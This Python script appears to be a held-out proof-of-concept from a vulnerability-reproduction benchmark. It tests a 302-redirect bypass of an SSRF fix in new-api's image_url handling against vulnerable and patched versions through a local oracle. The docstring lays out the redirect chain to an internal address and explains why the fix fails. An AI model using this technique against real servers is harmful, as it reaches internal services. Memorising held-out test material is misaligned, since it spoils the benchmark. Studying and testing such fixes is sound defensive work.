#!/usr/bin/env python3
"""
HELD OUT — residual PoC for CVE-2025-62155 (302-redirect bypass of the
CVE-2025-59146 SSRF fix).

The same authenticated chat-completion image_url flow, but the URL points at the
attacker's "public" host on an allowed port (8080). The attacker responds with an
HTTP 302 whose Location is the INTERNAL canary. new-api's fix (v0.9.0.5) validates
only the FIRST URL and then follows the redirect with Go's default client, which
has no CheckRedirect hook -> the internal target is never re-validated.

  http://11.11.11.10:8080/redirect  --302-->  http://172.31.9.9:80/internal-secret.png

Expected:
  v1 (0.9.0.5, CVE-2025-59146 fix) -> redirect followed unchecked: canary hit (residual SSRF)
  v2 (0.9.6,   CVE-2025-62155 fix) -> blocked: "redirect to ... blocked: private IP address not allowed"

The v0.9.6 fix (patch.diff) swaps http.Get(originUrl) for GetHttpClient().Get(originUrl),
where the client now carries CheckRedirect: checkRedirect, re-validating every hop.

Usage:  PCB_FLAG=<tok> python3 bypass_poc.py --port 3011   # v1 (bypass reaches flag)
        PCB_FLAG=<tok> python3 bypass_poc.py --port 3012   # v2 (blocked)
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import oracle  # noqa: E402

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=3011)
    args = ap.parse_args()
    base = "http://127.0.0.1:%d" % args.port
    oracle.wait_ready(base)
    res = oracle.run_case(args.port, "residual", {})
    print("flag_reached =", res.get("flag_reached"))
